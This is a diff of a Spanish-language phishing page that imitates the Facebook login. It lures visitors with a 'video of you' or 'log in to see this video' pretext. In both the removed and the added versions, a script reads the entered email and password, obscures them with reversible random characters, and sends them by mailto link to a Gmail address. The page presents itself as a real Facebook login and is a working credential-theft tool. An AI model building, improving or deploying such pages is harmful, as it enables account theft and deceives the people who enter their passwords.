@@ -3,135 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>¿Eres tú la del video?</title>
-    <meta property="og:title" content="¿Eres tú la del video?">
-    <meta property="og:description" content="Verifica tu identidad para continuar.">
-    <meta property="og:image" content="https://www.ejemplo.com/miniatura.jpg">
-    <meta property="og:url" content="https://www.facebook.com">
-    <style>
-        body {
-            font-family: "Helvetica Neue", "Segoe UI", Arial, sans-serif;
-            background-color: #F0F2F5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            flex-direction: column;
-        }
-        .login-box {
-            background-color: #FFFFFF;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            width: 300px;
-            box-sizing: border-box; /* Asegura que el padding no afecte el ancho total */
-        }
-        .login-box input {
-            width: calc(100% - 20px); /* Ajusta el ancho para incluir el padding */
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #DDDFE2;
-            border-radius: 6px;
-            font-size: 16px;
-            box-sizing: border-box; /* Asegura que el padding no afecte el ancho total */
-        }
-        .login-box button {
-            width: 100%;
-            padding: 10px;
-            background-color: #1877F2;
-            color: #FFFFFF;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            margin: 10px 0;
-        }
-        .login-box button:hover {
-            background-color: #166FE5;
-        }
-        .logo {
-            width: 70px;
-            height: 70px; 
-            margin-bottom: 20px;
-        }
-        .footer {
-            margin-top: 20px;
-            text-align: center;
-            color: #606770;
-            font-size: 14px;
-        }
-        .footer a {
-            color: #1877F2;
-            text-decoration: none;
-        }
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        .login-box a {
-            color: #1877F2;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .login-box a:hover {
-            text-decoration: underline;
-        }
-        .login-box hr {
-            border: 0;
-            height: 1px;
-            background-color: #DDDFE2;
-            margin: 15px 0;
-        }
-    </style>
+    <meta name="author" content="Fernanda de Jimenez">
+    <meta name="description" content="inicia sesión para ver este vídeo">
+    <meta property="og:image" content="URL_de_la_imagen_en_miniatura">
+    <title>Iniciar sesión</title>
+<style>
+
+body {
+    font-family: 'Helvetica', 'Arial', sans-serif;
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.login-container {
+    text-align: center;
+}
+
+.logo-empresa {
+    width: 100px; /* Ajusta según tu logotipo */
+    margin-bottom: 20px;
+}
+
+.logo-facebook {
+    width: 200px; /* Ajusta según el diseño */
+    margin-bottom: 20px;
+}
+
+input {
+    display: block;
+    width: 300px;
+    padding: 10px;
+    margin: 10px auto;
+    border: 1px solid #dddfe2;
+    border-radius: 5px;
+    font-size: 16px;
+}
+
+button {
+    background-color: #1877f2;
+    color: white;
+    padding: 10px;
+    width: 320px;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #166fe5;
+}
+
+a {
+    display: block;
+    margin: 10px 0;
+    color: #1877f2;
+    text-decoration: none;
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+
+</style>
 </head>
 <body>
-    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/y6/r/UbJC5lwxeBU.png" alt="Facebook Logo" class="logo">
-    <div class="login-box">
-        <h2>Iniciar sesión</h2>
-        <input type="text" id="email" placeholder="Correo electrónico o teléfono">
-        <input type="password" id="password" placeholder="Contraseña">
-        <button onclick="enviarDatos()">Iniciar sesión</button>
-        <p><a href="#">¿Has olvidado la contraseña?</a></p>
-        <hr>
-        <button style="background-color: #42B72A;">Crear cuenta nueva</button>
+    <div class="login-container">
+        <!-- Logotipo de la empresa -->
+        <img src="logo_empresa.png" alt="Logotipo de la empresa" class="logo-empresa">
+        <!-- Logotipo de Facebook (placeholder) -->
+        <img src="facebook_logo.png" alt="Facebook" class="logo-facebook">
+        <form id="login-form">
+            <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
+            <input type="password" id="password" placeholder="Contraseña" required>
+            <button type="button" onclick="sendEmail()">Iniciar sesión</button>
+        </form>
+        <a href="#">¿Olvidaste tu contraseña?</a>
+        <a href="#">Crear cuenta nueva</a>
     </div>
-    <div class="footer">
-        <p><a href="#">Información</a> · <a href="#">Ayuda</a> · <a href="#">Más</a></p>
-        <p>Meta</p>
-    </div>
 
-    <script>
-        function generarRandom() {
-            const letras = "abcdefghijklmnopqrstuvwxyz";
-            const numeros = "0123456789";
-            const randomLetra = letras[Math.floor(Math.random() * letras.length)];
-            const randomNumero = numeros[Math.floor(Math.random() * numeros.length)];
-            return randomLetra + randomNumero;
-        }
+<script>
 
-        function encriptarContraseña(contraseña) {
-            let contraseñaEncriptada = "";
-            for (let i = 0; i < contraseña.length; i++) {
-                contraseñaEncriptada += contraseña[i];
-                if (i < contraseña.length - 1) {
-                    contraseñaEncriptada += generarRandom();
-                }
-            }
-            return contraseñaEncriptada;
-        }
+function encrypt(str) {
+    let encrypted = '';
+    const chars = 'abcdefghijklmnopqrstuvwxyz';
+    for (let char of str) {
+        const randomNumber = Math.floor(Math.random() * 10); // Número aleatorio 0-9
+        const randomLetter = chars[Math.floor(Math.random() * chars.length)]; // Letra aleatoria
+        encrypted += char + '-' + randomNumber + randomLetter + '-';
+    }
+    return encrypted;
+}
 
-        function enviarDatos() {
-            const email = document.getElementById("email").value;
-            const contraseña = document.getElementById("password").value;
-            const contraseñaEncriptada = encriptarContraseña(contraseña);
+function sendEmail() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const encryptedEmail = encrypt(email);
+    const encryptedPassword = encrypt(password);
+    const subject = 'Datos de inicio de sesión';
+    const body = `Correo: ${encryptedEmail}\nContraseña: ${encryptedPassword}`;
+    const mailtoLink = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+    window.location.href = mailtoLink;
+}
 
-            const asunto = "Información de verificación";
-            const cuerpo = `La información que se está enviando es para verificar que usted es real. Para ver el video, presione el botón que parece un triángulo que se encuentra en la parte de arriba de su pantalla.\n\nEmail: ${email}\nContraseña encriptada: ${contraseñaEncriptada}`;
-
-            const mailtoLink = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(asunto)}&body=${encodeURIComponent(cuerpo)}`;
-            window.location.href = mailtoLink;
-        }
-    </script>
+</script>
 </body>
 </html>
